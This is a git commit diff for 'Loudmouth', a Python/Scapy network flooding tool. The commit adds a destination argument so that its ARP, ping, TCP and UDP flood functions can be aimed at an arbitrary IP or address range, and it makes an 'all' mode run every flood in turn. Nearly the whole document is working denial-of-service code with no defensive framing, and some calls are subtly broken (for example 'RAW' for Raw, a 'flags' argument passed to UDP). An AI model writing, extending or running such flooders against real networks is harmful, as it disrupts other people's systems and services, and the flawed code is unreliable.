659a2a3ef1ba594e94c9e92b0eef9d9f1b98588b
ejcSec <ejcbusiness@protonmail.com>
2021-10-16 17:15:29 -0400

    Added dest arg, modif flood methods

--- ldmth.py
+++ ldmth.py
@@ -3,19 +3,6 @@
 # ejcSec           #
 # Loudmouth        #
 ####################
-import logging
-
-logger = logging.getLogger('script_logger')
-logger.setLevel(logging.DEBUG)
-# create file handler which logs even debug messages
-# create console handler with a higher log level
-ch = logging.StreamHandler()
-ch.setLevel(logging.ERROR)
-# create formatter and add it to the handlers
-formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
-ch.setFormatter(formatter)
-# add the handlers to logger
-logger.addHandler(ch)
 
 import argparse, sys,socket
 from scapy.all import *
@@ -37,39 +24,44 @@ def asciibanner():
     #######  ####   ####  #####  #     #  ####   ####    #   #    #
     """)
 
-def arpflood(interface, pkt_count):
+def arpflood(interface, pkt_count, destination):
     print("Initializing ARP flood...")
     ip = get_if_addr(interface)
     # create an ARP request to flood the network with
     send(Ether('ff:ff:ff:ff:ff:ff')/ARP(op="who-has",pdst = ip), count = pkt_count)
 
-def pingflood(interface, pkt_count, range):
+def pingflood(interface, pkt_count, range, destination):
     print("Initializing ping flood...")
     ip = get_if_addr(interface)
     if range:
-        send(IP(dst = ip  + "/" + range, proto=(0,255))/"LoudMouth",iface = interface, count = pkt_count)
+        send(IP(dst = destination  + "/" + range, proto=(0,255))/"LoudMouth",iface = interface, count = pkt_count)
     else:
-        send(IP(dst = ip, proto=(0,255))/"LoudMouth",iface = interface, count = pkt_count)
+        send(IP(dst = destination, proto=(0,255))/"LoudMouth",iface = interface, count = pkt_count)
 
-def tcpflood(interface, pkt_count, range):
+def tcpflood(interface, pkt_count, range, destination):
     print("Initializing TCP flood...")
     ip = get_if_addr(interface)
     # generate ACK packaets
     if range:
-        send(IP(dst = ip + "/" + range)/TCP(dport=[80,8080],flags="A")/Raw("A"*1024), count = pkt_count)
+        send(IP(dst = destination + "/" + range)/TCP(dport=[80,8080],flags="A")/Raw("A"*1024), count = pkt_count)
     else:
-        send(IP(dst = ip)/TCP(dport=[80,8080],flags="A")/Raw("A"*1024), count = pkt_count)
+        send(IP(dst = destination)/TCP(dport=[80,8080],flags="A")/Raw("A"*1024), count = pkt_count)
 
-def udpflood(interface, pkt_count, range):
+def udpflood(interface, pkt_count, range, destination):
     print("inititalizing UDP flood...")
     ip = get_if_addr(interface)
-    if mask:
-        send(IP(dst = ip + "/" + range)/UDP(dport=[80,333],flags="P")/RAW("U"*1024),count = pkt_count)
+    if range:
+        send(IP(dst = destination + "/" + range)/UDP(dport=[80,333],flags="P")/RAW("U"*1024),count = pkt_count)
     else:
-        send(IP(dst = ip)/UDP(dport=[80,333],flags="P")/RAW("U"*1024),count = pkt_count)
+        send(IP(dst = destination)/UDP(dport=[80,333]),count = pkt_count)
 # carries out all packet floods one at a time
-def allflood(interface, pkt_count, range,  duration):
-    print("All floods will be initiated!")
+def allflood(interface, pkt_count, range, destination):
+    print("All floods will be initiated!\n")
+
+    arpflood(interface, pkt_count, destination)
+    pingflood(interface, pkt_count, range, destination)
+    udpflood(interface, pkt_count, range, destination)
+    tcpflood(interface, pkt_count, range, destination)
 
 def main():
     asciibanner()
@@ -79,23 +71,27 @@ def main():
     parser.add_argument('-v','--verbose',action = 'store_true', help = 'Instructs loudmouth to print our more output')
     parser.add_argument('-p','--packetcount',type = int, help = 'How many packets loudmouth will send (default = 10 packets)',default = 10)
     parser.add_argument('-r','--range', type = str, help = 'Range of IPs to send packets to')
+    parser.add_argument('-d','--destination', type = str, help = 'The destination IP to send the packets to')
     args = parser.parse_args()
+
+    # process args
     interface = args.interface
     pktcount = args.packetcount
     range = args.range
+    destination = args.destination
 
     if args.mode:
         chosen_flood  = args.mode
         if chosen_flood == 'arp':
-            arpflood(interface, pktcount)
+            arpflood(interface, pktcount, destination)
         elif chosen_flood  == 'tcp':
-            tcpflood(interface, pktcount, range)
+            tcpflood(interface, pktcount, range, destination)
         elif chosen_flood == 'ping':
-            pingflood(interface, pktcount,range)
+            pingflood(interface, pktcount, range, destination)
         elif chosen_flood == 'udp':
-            udpflood(interface, pktcount,range)
+            udpflood(interface, pktcount, range, destination)
         elif chosen_flood == 'all':
-            allflood()
+            allflood(interface, pktcount, range, destination)
 
 if __name__ == "__main__":
     main()
